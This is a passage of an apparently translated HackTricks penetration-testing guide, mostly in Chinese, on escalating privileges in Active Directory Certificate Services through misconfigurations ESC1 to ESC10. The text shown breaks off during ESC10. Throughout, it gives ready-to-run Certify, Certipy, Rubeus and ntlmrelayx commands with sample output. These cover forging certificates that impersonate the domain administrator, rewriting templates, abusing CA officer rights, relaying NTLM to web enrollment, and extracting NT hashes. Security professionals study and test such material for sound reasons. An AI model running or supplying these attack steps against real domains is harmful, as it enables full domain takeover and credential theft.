# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**以下是相关文章中 escalation technique 部分的总结：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 配置错误的 Certificate Templates - ESC1

### 说明

### 配置错误的 Certificate Templates - ESC1 详解

- **Enterprise CA 向低权限用户授予了 Enrolment 权限。**
- **不需要 Manager approval。**
- **不需要授权人员的签名。**
- **Certificate Templates 上的 Security descriptors 过于宽松，使低权限用户能够获得 Enrolment 权限。**
- **Certificate Templates 被配置为定义可促进 authentication 的 EKU：**
- 包含 Client Authentication（OID 1.3.6.1.5.5.7.3.2）、PKINIT Client Authentication（1.3.6.1.5.2.3.4）、Smart Card Logon（OID 1.3.6.1.4.1.311.20.2.2）、Any Purpose（OID 2.5.29.37.0）或无 EKU（SubCA）等 Extended Key Usage（EKU）标识符。
- **Template 允许 requesters 在 Certificate Signing Request（CSR）中包含 subjectAltName：**
- 如果 certificate 中存在 subjectAltName（SAN），Active Directory（AD）会在 identity verification 时优先使用它。这意味着，通过在 CSR 中指定 SAN，可以请求 certificate 来 impersonate 任意用户（例如 domain administrator）。Requester 是否能够指定 SAN，由 certificate template 的 AD object 中的 `mspki-certificate-name-flag` 属性决定。该属性是一个 bitmask，而 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag 的存在允许 requester 指定 SAN。

> [!CAUTION]
> 此配置允许低权限用户请求包含任意 SAN 的 certificates，从而能够通过 Kerberos 或 SChannel 以任意 domain principal 的身份进行 authentication。

此功能有时会被启用，以支持 products 或 deployment services 动态生成 HTTPS 或 host certificates，也可能是由于缺乏相关理解。

需要注意的是，使用此选项创建 certificate 会触发 warning；但复制现有的 certificate template（例如已启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` template），然后对其进行修改以包含 authentication OID 时，则不会触发该 warning。<sup>[[6]](#references)</sup>

### Abuse

要**查找存在漏洞的 certificate templates**，可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**利用此漏洞冒充管理员**，可以运行：
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
然后，你可以将生成的 **certificate 转换为 `.pfx`** 格式，并再次使用它通过 **Rubeus 或 certipy 进行身份验证**：<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件 "Certreq.exe" 和 "Certutil.exe" 可用于生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以运行以下 LDAP 查询，对 AD Forest 的配置架构中的证书模板进行枚举，具体筛选条件为：无需审批或签名、具有 Client Authentication 或 Smart Card Logon EKU，并启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 配置错误的证书模板 - ESC2

### 说明

第二种 abuse 场景是第一种场景的变体：

1. Enterprise CA 向低权限用户授予了 Enrollment 权限。
2. 禁用了管理员批准要求。
3. 省略了授权签名要求。
4. 证书模板上的过度宽松 security descriptor 向低权限用户授予了证书 Enrollment 权限。
5. **证书模板被定义为包含 Any Purpose EKU，或不包含 EKU。**

**Any Purpose EKU** 允许攻击者出于**任何目的**获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以使用**用于 ESC3 的相同 technique**来利用此场景。

**不包含 EKU** 的证书会充当 subordinate CA 证书，因此可被用于**任何目的**，并且**还可用于签发新证书**。因此，攻击者可以利用 subordinate CA 证书，在新证书中指定任意 EKU 或字段。

但是，如果 subordinate CA 不受 **`NTAuthCertificates`** 对象信任（默认设置），则为**域身份验证**创建的新证书将无法正常工作。尽管如此，攻击者仍然可以创建具有**任意 EKU** 和任意证书值的**新证书**。这些证书可能被滥用于各种目的（例如代码签名、服务器身份验证等），并可能对网络中的其他应用产生重大影响，例如 SAML、AD FS 或 IPSec。<sup>[[6]](#references)</sup>

要在 AD Forest 的配置 schema 中枚举符合此场景的模板，可以运行以下 LDAP query：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置错误的 Enrollment Agent Templates - ESC3

### 说明

此场景与第一个和第二个场景类似，但**abusing**了一个**不同的 EKU**（Certificate Request Agent）以及**2 个不同的模板**（因此具有 2 组要求）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 **Enrollment Agent**，允许主体代表**其他用户**为**证书**执行 **enroll**。

**“enrollment agent”** 在此类**模板**中进行 **enroll**，并使用生成的**证书代表其他用户对 CSR 进行共同签名**。随后，它将**共同签名的 CSR**发送到 CA，在允许“**代表其他主体进行 enroll**”的**模板**中执行 enroll，CA 则返回一张**属于“其他”用户的证书**。<sup>[[6]](#references)</sup>

**要求 1：**

- Enterprise CA 向低权限用户授予 enrollment 权限。
- 未启用 manager approval 要求。
- 不要求 authorized signatures。
- 证书模板的 security descriptor 过于宽松，向低权限用户授予 enrollment 权限。
- 证书模板包含 Certificate Request Agent EKU，从而能够代表其他主体请求其他证书模板。

**要求 2：**

- Enterprise CA 向低权限用户授予 enrollment 权限。
- 绕过 manager approval。
- 模板的 schema version 为 1 或高于 2，并指定了要求 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
- 证书模板中定义的某个 EKU 允许 domain authentication。
- CA 未应用 enrollment agent 限制。

### Abuse

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来 abuse 此场景：<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
允许**获取** **enrollment agent certificate** 的 **users**、允许 **agents** 进行 enrollment 的模板，以及 enrollment agent 可以代表其执行操作的 **accounts**，都可以由 enterprise CA 进行限制。具体操作是打开 `certsrc.msc` **管理单元**，**右键单击 CA**，**点击 Properties**，然后**导航**到“Enrollment Agents”选项卡。

但是需要注意，CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用 enrollment agents 限制并将其设置为“Restrict enrollment agents”时，默认配置仍然极其宽松。它允许 **Everyone** enroll 到所有模板中，并代表任意身份执行操作。

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** 上的**安全描述符**定义了特定 **AD principals** 针对该模板拥有的**权限**。

如果**攻击者**拥有**修改**某个**模板**所需的**权限**，并能够实施**前文各节**中所述的任何**可利用错误配置**，则可能实现 privilege escalation。

适用于 certificate templates 的重要权限包括：<sup>[[6]](#references)</sup>

- **Owner:** 授予对对象的隐式控制权，允许修改任意属性。
- **FullControl:** 授予对对象的完全控制权，包括修改任意属性的能力。
- **WriteOwner:** 允许将对象的所有者更改为攻击者控制的 principal。
- **WriteDacl:** 允许调整访问控制，从而可能授予攻击者 FullControl。
- **WriteProperty:** 授权编辑任意对象属性。

### Abuse

使用 Certify 枚举具有模板及其他 PKI 对象编辑权限的 principals：
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
一个类似于前一个示例的 privesc：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

当用户对 certificate template 具有写入权限时，就是 ESC4。例如，可以滥用该权限覆盖 certificate template 的配置，使该 template 对 ESC1 变得脆弱。

正如上方路径所示，只有 `JOHNPC` 具有这些权限，但我们的用户 `JOHN` 对 `JOHNPC` 新增了 `AddKeyCredentialLink` edge。由于该技术与 certificates 相关，我也实现了这种攻击，该攻击称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。<sup>[[8]](#references)</sup>下面简要展示 Certipy 的 `shadow auto` 命令如何获取受害者的 NT hash。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以使用单条命令覆盖证书模板的配置。**默认情况下**，Certipy 会**覆盖**配置，使其**易受 ESC1 攻击**。我们还可以指定 **`-save-old` 参数以保存旧配置**，这对于在攻击后**恢复**配置很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

由 ACL-based relationships 构成的复杂互联关系网络不仅涉及 certificate templates 和 certificate authority，还包括多个其他对象，这些关系可能影响整个 AD CS 系统的安全性。这些可能显著影响安全性的对象包括：

- CA server 的 AD computer object，该对象可能通过 S4U2Self 或 S4U2Proxy 等机制遭到 compromise。
- CA server 的 RPC/DCOM server。
- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 中的任何 descendant AD object 或 container。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 以及 Enrollment Services Container 等容器和对象。

如果低权限 attacker 成功控制其中任何一个关键组件，PKI system 的安全性就可能遭到 compromise。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag 的影响，Microsoft 也对此进行了说明。在 Certification Authority (CA) 上启用此配置后，便允许在**任何 request** 的 **subject alternative name** 中加入**用户定义的值**，包括根据 Active Directory® 构造的 request。因此，**intruder** 可以通过任何为 domain **authentication** 配置的 **template** 进行 enrollment，尤其是那些允许**非特权**用户 enrollment 的 template，例如标准 User template。这样一来，便可以获得一个 certificate，使 **intruder** 能够以 domain administrator 或 domain 中**任何其他活动实体**的身份进行 authentication。<sup>[[9]](#references)</sup>

**Note**：通过 `certreq.exe` 中的 `-attrib "SAN:"` 参数（称为“Name Value Pairs”）将 **alternative names** 添加到 Certificate Signing Request (CSR) 的方式，与 ESC1 中对 SAN 的 exploitation strategy **不同**。区别在于 **account information 的封装方式**不同：这里的 account information 位于 certificate attribute 中，而不是 extension 中。

### Abuse

要验证该设置是否已启用，organizations 可以使用以下 `certutil.exe` command：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
此操作本质上采用 **远程注册表访问**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
诸如 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 之类的工具能够检测此配置错误并加以利用：<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要修改这些设置，只要拥有 **domain administrative** 权限或等效权限，即可从任意工作站执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在您的环境中禁用此配置，可以使用以下命令移除该标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 在 2022 年 5 月安全更新之后，新签发的 **certificates** 将包含一个 **security extension**，其中纳入了 **requester 的 `objectSid` 属性**。对于 ESC1，此 SID 源自指定的 SAN。但是，对于 **ESC6**，该 SID 与 **requester 的 `objectSid`** 相同，而不是来自 SAN。\
> 要利用 ESC6，系统必须容易受到 ESC10（Weak Certificate Mappings）的影响，因为 ESC10 会优先使用 **SAN，而不是新的 security extension**。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate authority 的访问控制通过一组用于管理 CA 操作的权限来维护。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后进入 Security 选项卡来查看这些权限。此外，还可以使用 PSPKI module 通过以下命令枚举权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这提供了对主要权限的深入了解，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA administrator”和“Certificate Manager”角色。<sup>[[6]](#references)</sup>

#### Abuse

在 certificate authority 上拥有 **`ManageCA`** 权限后，principal 可以使用 PSPKI 远程操纵设置。其中包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag，以允许在任何 template 中指定 SAN，这是域提权的关键环节。

使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 可以简化此过程，无需直接与 GUI 交互即可修改设置。

拥有 **`ManageCertificates`** 权限可以批准 pending requests，从而有效绕过“CA certificate manager approval”保护机制。

可以结合使用 **Certify** 和 **PSPKI** modules 来请求、批准并下载 certificate：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻击 2

#### 说明

> [!WARNING]
> 在**上一个攻击**中，使用了 **`Manage CA`** 权限来**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志，以执行 **ESC6 attack**，但在重启 CA 服务（`CertSvc`）之前不会生效。当用户拥有 `Manage CA` 访问权限时，该用户也可以**重启服务**。但是，这**并不意味着该用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，在大多数已打补丁的环境中，E**SC6 可能无法直接生效**。

因此，这里介绍另一种攻击。

前提条件：

- 仅需要 **`ManageCA` permission**
- **`Manage Certificates`** 权限（可从 **`ManageCA`** 授予）
- 必须**启用**证书模板 **`SubCA`**（可从 **`ManageCA`** 启用）

该技术利用了以下事实：拥有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**签发失败的证书请求**。**`SubCA`** 证书模板存在 **ESC1** 漏洞，但只有**管理员**可以注册该模板。因此，**用户**可以请求注册 **`SubCA`** ——该请求会被**拒绝**——但之后可以由管理员签发。<sup>[[6]](#references)</sup>

#### 滥用

你可以通过将自己的用户添加为新的证书管理员，**授予自己 `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以使用 `-enable-template` 参数在 CA 上**启用**。默认情况下，`SubCA` 模板处于启用状态。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已满足此攻击的前置条件，就可以开始**请求基于 `SubCA` 模板的证书**。

**此请求将被拒绝**，但我们会保存私钥并记下请求 ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
借助我们的 **`Manage CA` 和 `Manage Certificates`**，随后即可使用 `ca` 命令及 `-issue-request <request ID>` 参数**签发失败的证书请求**。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数来**获取已签发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 攻击 3 – Manage Certificates 扩展滥用（SetExtension）

#### 说明

除了经典的 ESC7 滥用方式（启用 EDITF 属性或批准待处理请求）之外，**Certify 2.0** 还揭示了一种全新的 primitive：只需要 Enterprise CA 上的 *Manage Certificates*（又称 **Certificate Manager / Officer**）角色即可使用。<sup>[[3]](#references)</sup>

任何持有 *Manage Certificates* 权限的 principal 都可以执行 `ICertAdmin::SetExtension` RPC 方法。该方法传统上由合法 CA 用于更新**待处理**请求中的扩展，但攻击者可以滥用它，将一个*非默认*证书扩展（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）追加到等待批准的请求中。

由于目标模板**没有为该扩展定义默认值**，请求最终签发时，CA **不会**覆盖攻击者控制的值。因此，生成的证书会包含攻击者选择的扩展，该扩展可能：

* 满足其他易受攻击模板的 Application / Issuance Policy 要求（从而实现权限提升）。
* 注入额外的 EKU 或 policy，使该证书在第三方系统中获得意外的信任。

简而言之，*Manage Certificates* ——此前被认为是 ESC7 中“权限较低”的一半——现在可以用于实现完整的权限提升或长期持久化，而无需修改 CA 配置，也不需要限制更严格的 *Manage CA* 权限。

#### 使用 Certify 2.0 滥用该 primitive

1. **提交一个将保持*待处理*状态的证书请求。** 可以使用要求 manager approval 的模板来强制实现：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 使用新的 `manage-ca` command 向待处理请求**追加自定义扩展**：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*如果模板尚未定义 *Certificate Issuance Policies* 扩展，上述值将在签发后保留。*

3. **签发请求**（如果你的角色同时具有 *Manage Certificates* approval 权限），或等待 operator 批准请求。签发后，下载证书：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成的证书现在包含恶意的 issuance-policy OID，可用于后续攻击（例如 ESC13、domain escalation 等）。

> 注意：也可以通过 `ca` command 和 `-set-extension` 参数，使用 Certipy ≥ 4.7 执行相同的攻击。

## NTLM Relay 到 AD CS HTTP Endpoints – ESC8

### 说明

> [!TIP]
> 在安装了 **AD CS** 的环境中，如果存在一个**易受攻击的 web enrollment endpoint**，并且至少发布了一个允许 domain computer enrollment 和 client authentication 的**证书模板**（例如默认的 **`Machine`** 模板），则**任何 spooler service 处于活动状态的计算机都可能被攻击者 compromise**！

AD CS 支持多种基于 **HTTP** 的 enrollment 方法，这些方法通过管理员可能安装的其他 server roles 提供。这些基于 HTTP 的证书 enrollment interfaces 容易受到 **NTLM relay attacks** 的影响。攻击者可以从**已 compromise 的计算机**发起攻击，冒充任何通过 inbound NTLM 进行 authentication 的 AD account。冒充 victim account 时，攻击者可以访问这些 web interfaces，并使用 `User` 或 `Machine` certificate templates **请求 client authentication certificate**。

- **web enrollment interface**（较旧的 ASP application，可通过 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，因此无法防御 NTLM relay attacks。此外，它明确只允许通过 Authorization HTTP header 使用 NTLM authentication，使 Kerberos 等更安全的 authentication methods 无法适用。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service 和 **Network Device Enrollment Service**（NDES）默认支持通过 Authorization HTTP header 使用 negotiate authentication。Negotiate authentication **同时支持** Kerberos 和 **NTLM**，因此攻击者可以在 relay attacks 期间将 authentication **降级为 NTLM**。尽管这些 web services 默认启用 HTTPS，但仅使用 HTTPS **无法防御 NTLM relay attacks**。只有在 HTTPS 与 channel binding 结合使用时，HTTPS services 才能防御 NTLM relay attacks。遗憾的是，AD CS 不会在 IIS 上启用 Extended Protection for Authentication，而 channel binding 需要该功能。<sup>[[6]](#references)</sup>

NTLM relay attacks 的一个常见**问题**是 NTLM sessions 的**持续时间很短**，并且攻击者无法与**要求 NTLM signing** 的 services 交互。

然而，可以通过 NTLM relay attack 获取用户证书来克服这一限制，因为证书的有效期决定了 session 的持续时间，并且该证书可以与**强制要求 NTLM signing** 的 services 一起使用。有关如何使用被盗证书的说明，请参阅：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks 的另一个限制是，**victim account 必须对攻击者控制的计算机进行 authentication**。攻击者可以等待，或尝试**强制**该 authentication：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **滥用**

[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 会枚举**已启用的 HTTP AD CS endpoints**：<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性由企业证书颁发机构（CAs）用于存储证书注册服务（CES）端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用

Certipy 默认根据 `Machine` 或 `User` template 请求证书，具体取决于被 relay 的账户名称是否以 `$` 结尾。通过使用 `-template` 参数可以指定其他 template。

随后可以使用类似 [PetitPotam](https://github.com/ly4k/PetitPotam) 的 technique 来强制进行 authentication。处理 domain controllers 时，必须指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### 说明

**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）是 **`msPKI-Enrollment-Flag`** 的新值，也称为 ESC9。它会阻止在证书中嵌入**新的 `szOID_NTDS_CA_SECURITY_EXT` security extension**。当 **`StrongCertificateBindingEnforcement`** 被设置为 `1`（默认值）而不是 `2` 时，此 flag 会变得相关。如果较弱的证书映射方式可能被用于 Kerberos 或 Schannel（如 ESC10 中所示），其相关性会进一步提高，因为在没有 ESC9 的情况下，要求不会发生变化。<sup>[[7]](#references)</sup>

以下情况下，该 flag 的设置会变得重要：

- `StrongCertificateBindingEnforcement` 未调整为 `2`（默认值为 `1`），或 `CertificateMappingMethods` 包含 `UPN` flag。
- 证书在 `msPKI-Enrollment-Flag` 设置中被标记为 `CT_FLAG_NO_SECURITY_EXTENSION` flag。
- 证书指定了任意 client authentication EKU。
- 对任意账户拥有 `GenericWrite` 权限，从而可以 compromise 另一个账户。

### Abuse Scenario

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是 compromise `Administrator@corp.local`。`Jane@corp.local` 被允许 enroll 的 `ESC9` certificate template，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` flag。

首先，利用 `John` 的 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的 hash：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，将 `Jane` 的 `userPrincipalName` 修改为 `Administrator`，故意省略 `@corp.local` 域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
此修改不违反约束，因为 `Administrator@corp.local` 仍作为 `Administrator` 的 `userPrincipalName` 保持独立。

随后，以 `Jane` 身份请求标记为存在漏洞的 `ESC9` certificate template：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
需要注意的是，该证书的 `userPrincipalName` 显示为 `Administrator`，且不包含任何“object SID”。

随后，将 `Jane` 的 `userPrincipalName` 恢复为原始值 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
现在尝试使用已签发的证书进行身份验证，可以获得 `Administrator@corp.local` 的 NT hash。由于证书中缺少域规范，命令必须包含 `-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

域控制器上的两个注册表键值与 ESC10 相关：

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下 `CertificateMappingMethods` 的默认值为 `0x18`（`0x8 | 0x10`），此前为 `0x1F`。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下 `StrongCertificateBindingEnforcement` 的默认设置为 `1`，此前为 `0`。<sup>[[7]](#references)</sup>

**Case 1**

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。

**Case 2**

如果 `CertificateMappingMethods` 包含 `UPN` 位（`0x4`）。

### Abuse Case 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的账户 A 可被利用来 compromise 任意账户 B。

例如，攻击者对 `Jane@corp.local` 具有 `GenericWrite` 权限，并希望 compromise `Administrator@corp.local`。该过程与 ESC9 相同，因此可以使用任意 certificate template。

首先，攻击者利用 `GenericWrite` 通过 Shadow Credentials 获取 `Jane` 的 hash。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，将 `Jane` 的 `userPrincipalName` 修改为 `Administrator`，故意省略 `@corp.local` 部分，以避免违反约束。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
随后，以 `Jane` 身份使用默认的 `User` 模板请求启用客户端身份验证的证书。
```bash
